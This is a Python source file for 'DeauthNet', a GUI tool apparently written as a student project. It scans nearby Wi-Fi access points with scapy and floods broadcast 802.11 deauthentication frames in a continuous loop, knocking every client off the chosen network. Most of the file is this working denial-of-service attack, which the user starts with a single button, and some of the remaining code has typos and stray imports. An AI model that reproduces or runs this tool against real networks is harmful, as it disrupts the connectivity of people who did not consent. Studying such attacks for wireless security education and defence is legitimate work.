#!/usr/local/sbin python

# Imports des différents modules liés à l'interface graphique, threads, commandes système, etc
import sys
import os
import platform
from tkinter import messagebox
import PIL
import button as button
import img as img
import scapy.all as scapy
from scapy.layers.dot11 import *
from PIL import ImageTk, Image
from tkinter import *
import tkinter as tk
import tkinter.ttk as ttk
from tkinter.ttk import Label
import psutil
import subprocess
import threading, time

SYSTEM = platform.system() # Detection du système actuel afin d'utiliser les commandes adéquates pour de l'initialisation de la carte réseau (wlan0 ou autre) 
addrs = list(psutil.net_if_addrs().keys())
addrs.sort()
iface = addrs[-1]

# ========================================== CONF
def setchan(chan=13):  # la fonction suivante permet d'initialiser la carte réseau de la machine actuelle en mode monitor selon le système sur lequel s'exécute le programme
    global iface
    if SYSTEM == "Linux":
        os.system(f"ip link set dev {iface} down")
        if os.system(f"iwconfig {iface} mode monitor") !=0:
            return False
        if os.system(f"iwconfig {iface} channel {chan}") !=0: return False
        os.system(f"ip link set dev {iface} up")
    elif SYSTEM == "Windows":
        if os.system(f'wlanhelper "{iface}" mode monitor') != 0: return False
        if os.system(f'wlanhelper "{iface}" channel {chan}') != 0: return False
    elif SYSTEM == "Darwin":
        os.system(f"sudo ifoncfig {iface} down")
        os.system("sudo airport -z")
        os.system(f"sudo ifonconfig {iface} up")
        if os.system(f"sudo airport --channel={chan} --monitor={iface}") !=0: return False
    print("Changed to channel ", chan)
    return True


def initialize_wlan0():
    # subprocess.call(["apt-get", "install", "wlan0-driver"])
    os.system("systemctl stop NetworkManager")
    setchan()
    print("Done")


def check_device(): # check si le mode monitor est disponible sur l'interface choisie
        if not(setchan(usrchan.get())):
            messagebox.showerror(title, f"Unable to set {iface} into monitor mode !\nPlease choose another interface")
            return False
        else: 
            return True

# ========================================== ATTACK & GUI 
stop_event = threading.Event() # Multi-threading pour pouvoir lancer une boucle infinie sans faire crasher le programme (lors de l'arrêt) 

def spammer():
    if not stop_event.is_set():
        deauth_attack()
        root.after(1, spammer) # délai ajouté 

def onClick():
    global button_state
    if check_device():
        if button_state == "Start Deauth attack": 
            button_state = "no"
            btndn.config(text="Start Deauth attack", fg='#22FF00')
            stop_event.set()
        else:
            if usrchan.get().isnumeric() and 0<int(usrchan.get())<150:
                setchan(usrchan.get())
                button_state = "Start Deauth attack"
                btndn.config(text="Stop Deauth attack", fg='#FF2626')
                stop_event.clear()
                thread = threading.Thread(target=spammer)
                thread.start()
            else:
                messagebox.showerror(title, f"Unable to start the attack on the channel {usrchan.get()} !\nPlease change channel (1-149)")
    else:
        messagebox.showerror(title, f"Unable to start the attack with the interface {iface} !")


def GetAPStation(*args, **kwargs): # récupération des APs disponibles et retour de leur nom et adresse MAC 
    ap = []
    packets = []

    def PacketFilter(pkt):
        if pkt.haslayer(scapy.Dot11Elt) and pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap:
                ap.append(pkt.addr2)
                packets.append((pkt.info).decode("utf-8"))

    scapy.sniff(count=30, prn=PacketFilter, *args, **kwargs)
    return [ap, packets]

def refresh(): # fonction liée au bouton refresh -> capture des macs et des noms des APS disponible
    global t, liste, AP_list
    t=[[]]
    if check_device():
        if usrchan.get().isnumeric() and 0<int(usrchan.get())<150:
            setchan(usrchan.get())
        else:
            messagebox.showerror(title, f"Unable to start the attack on the channel {usrchan.get()} !\nPlease change channel (1-149)")
        t = GetAPStation(iface=iface)
    if len(AP_list) != 0:
        AP_list=[]
        liste.delete(0,END)
    for i in range(len(t[0])):
        liste.insert(END, "• "+t[1][i] + " ( " + t[0][i] + " )")
        AP_list.append(t[0][i])
    


def deauth_attack(): # Contructeur de paquets Deauth
    AP_MAC = current_ap
    CLIENT_MAC = "ff:ff:ff:ff:ff:ff" # Cible en broadcast-> deconnexion des appareils connectés au point d'accès choisit (spécifié dans AP_MAC) 

    packet = RadioTap() / \
             Dot11( \
                 type=0,
                 subtype=12,
                 addr1=CLIENT_MAC,
                 addr2=AP_MAC,
                 addr3=AP_MAC
             ) / \
             Dot11Deauth(reason=7)

    scapy.sendp(packet, iface=iface)

def aboutButton():
    messagebox.showinfo(title, "Program created by Uysse & Jean-Baptiste during SAE 304.\n\nHow to use it:\n1st: Refresh the list ↻\n\n2nd: Select a channel for the targeted AP.\n\n3rd: Start deauthentication attack !")

def changeInt(select): 
    global iface
    iface=select

def onselect(evt):
    global current_ap
    current_ap = liste.get(liste.curselection()[0])
    current_ap=current_ap.split("(")[1].split(")")[0].split(" ")[1]

t = [[]] # L'ensemble du design de la fenêtre (taille et redimensionnement d'image-> selon ), labels, boutons, entrée utilisateur, listbox etc 
current_ap=""
title = "DeauthNet (beta) v 1.0"
initialize_wlan0()
root = tk.Tk()
root.geometry('450x550')
sizew = root.winfo_width()
sizeh = root.winfo_height()
root.title(title)
root.configure(bg="black")
root.resizable(False, False)
img = PIL.Image.open("./entete.png")
resized = img.resize((428, 100), PIL.Image.Resampling.LANCZOS)
newimg = ImageTk.PhotoImage(resized)
panel = Label(root, image=newimg)
panel.pack(side=TOP, fill="both", expand="no", padx=10, pady=5)
frconf = LabelFrame(root, text="System Configuration", fg='red', bg='black', font="Monaco 12 bold", width=130, height=50)

Deauthtxt = Label(frconf, text=f"OS Detected: {SYSTEM}", font="Monaco 10 bold", foreground='#7F00FF', background="#000000")
Deauthtxt.pack(ipady=10, anchor="w", padx=10)

intxt = Label(frconf, text="Interface: ", font="Monaco 10 bold", foreground='white', background="#000000")
intxt.pack(ipady=0, anchor="w", side=LEFT, padx=10)
# Liste des interfaces
options = addrs
# datatype of menutext
data = StringVar()
data.set(iface)
ddmenu = OptionMenu(frconf, data,command=changeInt, *options)
ddmenu.pack(anchor="e", side=LEFT, padx=10)
frconf.pack(fill="both", expand="no", padx=10, pady=10, anchor=N)

AP_list = []
lframe = LabelFrame(root, text="BSSID | ( @MAC )", fg='white', font="Monaco 12 bold", width=270, height=300)
lframe.configure(bg="#525252")
var = IntVar(value=0)
usrchan = Entry(root, width=3, textvariable=StringVar(value="1"), state=NORMAL)
root.update()

scrollbar = Scrollbar(lframe)
liste = Listbox(lframe, yscrollcommand = scrollbar.set, bg="#525252", fg="#FF9A00", font="Monaco 10 bold")
liste.bind('<<ListboxSelect>>', onselect)

scrollbar.pack( side = RIGHT, fill = Y )
refresh()
liste.pack(fill = BOTH )
scrollbar.config( command = liste.yview )

lframe.pack(fill="both", expand="no", padx=10, pady=10, anchor=N)
btnsear = Button(root, text="↻", font="Monaco 17 bold", fg="white", bg="#525252", height=1, command=refresh)
btnsear.pack(anchor="n", padx=10, ipadx=15, side=LEFT)

chanlab = Label(root, text="Channel: ", font="Monaco 9 bold", foreground='#FF007F', background="#000000")
chanlab.pack(anchor="n", side=LEFT)
usrchan.pack(anchor="n", side=LEFT)
Button(root, text="About", font="Monaco 10 bold", fg="white", bg="#525252", height=1, command=aboutButton).place(x=10, y=510)
# Labels SSID avec leurs MACs spécifiés
button_state="no"
btndn = Button(root, text="Start Deauth attack", font="Monaco 12 bold", fg="#22FF00", bg="#525252", height=2, command=onClick)
btndn.pack(anchor="e", side=BOTTOM, pady=10, padx=10)
# btndn.place(relx=0.27, rely=0.85)
root.mainloop()

